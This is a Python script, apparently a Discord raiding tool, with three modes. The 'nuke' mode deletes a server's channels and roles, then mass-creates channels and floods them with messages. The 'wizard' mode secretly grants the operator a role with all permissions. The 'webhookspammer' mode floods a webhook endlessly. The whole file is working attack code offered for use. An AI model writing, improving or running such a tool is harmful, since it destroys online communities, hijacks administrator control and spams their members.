#made by Hax1020#5524 :3

import os
import time

try:
  import discord
  from discord.ext import commands
  from discord import Permissions
  from discord import Webhook, RequestsWebhookAdapter, Embed
except ImportError: 
  input(
      f"Module discord not installed, to install run '{'py -3' if os.name == 'nt' else 'python3.8'} -m pip install discord.\npress enter to exit")
  exit()

try:
  import threading
except ImportError: 
  input(
      f"Module threading not installed, to install run '{'py -3' if os.name == 'nt' else 'python3.8'} -m pip install threading.\npress enter to exit")
  exit()

try:
  import requests
except ImportError: 
  input(
      f"Module requests not installed, to install run '{'py -3' if os.name == 'nt' else 'python3.8'} -m pip install requests.\npress enter to exit")
  exit()

try:
  import colorama
  from colorama import init, Fore, Back, Style
except ImportError: 
  input(
      f"Module colorama not installed, to install run '{'py -3' if os.name == 'nt' else 'python3.8'} -m pip install colorama.\npress enter to exit")
  exit()

init(autoreset=True)



def nuke(channels_name, message):

    client = commands.Bot(command_prefix = "!")

    @client.event
    async def on_ready():
        print('Logged in as: ' + client.user.name)
        print('Ready!\n')

    @client.command()
    async def nuke(ctx):
        await ctx.message.delete()
        guild = ctx.guild

        try:
            for i in  guild.channels:
                await i.edit(name="oh no")
            print(Style.BRIGHT + Fore.GREEN + "[+]" + Style.BRIGHT + Fore.WHITE + f"changing {i.name}")
        except:
            print(Style.BRIGHT + Fore.RED + "[-]you don't have premission to edit channels name")
    
        time.sleep(4)

        try:
            for i in  guild.channels:
                await i.delete()
            print(Style.BRIGHT + Fore.GREEN + "[+]" + Style.BRIGHT + Fore.WHITE + f"deleting {i.name}")
        except:
            print(Style.BRIGHT + Fore.RED + "[-]you don't have premission to delete channels")

        try:
            for j in guild.roles:
                await j.delete()
                print(Style.BRIGHT + Fore.GREEN + "[+]" + Style.BRIGHT + Fore.WHITE + f"deleting {j.name}")
        except:
            print(Style.BRIGHT + Fore.RED + "[-]you don't have premission to delete roles")

        try:
            for p in range(500):
                await guild.create_text_channel(channels_name)
                print(Style.BRIGHT + Fore.GREEN + "[+]" + Style.BRIGHT + Fore.WHITE + "making channel")
                time.sleep(4)
        except:
            print(Style.BRIGHT + Fore.RED + "[-]you don't have premission to make channels")

    @client.event
    async def on_guild_channel_create(channel):
        while True:
            try:
                await channel.send(message)
                print(Style.BRIGHT + Fore.GREEN + "[+]" + Style.BRIGHT + Fore.WHITE + f"sending message: {message}")
            except:
                print(Style.BRIGHT + Fore.RED + "[-]sending message faild!")

    def thread():
       thread = threading.Thread(target =  on_guild_channel_create, args=token)
       thread.start()

    client.run(f"{token}")


def wizard(discord_id):

    client = commands.Bot(command_prefix = "!")

    @client.event
    async def on_ready():
        print('Logged in as: ' + client.user.name)
        print('Ready!\n')


    @client.command()
    async def wizard(ctx):
        if ctx.message.author.id == discord_id:
            try:
                print("Wizarding server...")
                member = ctx.author
                await ctx.guild.create_role(name='new roley', permissions=Permissions.all())
                role = discord.utils.get(member.guild.roles, name='new roley')
                await member.add_roles(role)
                print(Style.BRIGHT + Fore.GREEN + "[+]" + Style.BRIGHT + Fore.WHITE + "WIzarding server successfully finished\nadminisator role for " + Style.BRIGHT + Fore.BLUE + ctx.author)
            except:
                print(Style.BRIGHT + Fore.RED + "[-]Wizarding server failed!\nyou don't have premission for this.")

    client.run(f"{token}")

def spammer(url, message, delay):

    payload = {'content': message}

    while True:
        try:
            s = requests.post(url, json=payload)
            print(Style.BRIGHT + Fore.GREEN + "[+]" + Style.BRIGHT + Fore.WHITE + f"sending: {message}")
            if delay == 0:
                pass
            else:
                time.sleep(delay)
            
        except:
            print(Style.BRIGHT + Fore.YELLOW + "[-]message payload sending faild!\ntrying discord webhook method")
            try:
                webhook = Webhook.from_url('webhook-url-here', adapter=RequestsWebhookAdapter())
                webhook.send(content=message)
                print(Style.BRIGHT + Fore.GREEN + "[+]" + Style.BRIGHT + Fore.WHITE + f"sending: {message}")
            except:
                print(Style.BRIGHT + Fore.RED + "[-]message payload sending faild!")


choise = int(input("action: 1=nuke, 2=wizarding server, 3=webhookspammer > "))

if choise == 1:
    token = input("bot token> ")
    channels_name = input("channels name> ")
    message = input("message> ")
    nuke(channels_name, message)

elif choise == 2:
    token = input("bot token> ")
    discord_id = int(input("your discord id> "))
    wizard(discord_id)

elif choise == 3:
    url = input("webhook url> ")
    message = input("message> ")
    delay = int(input("delay> "))
    spammer(url, message, delay)

else:
    print("not defined!")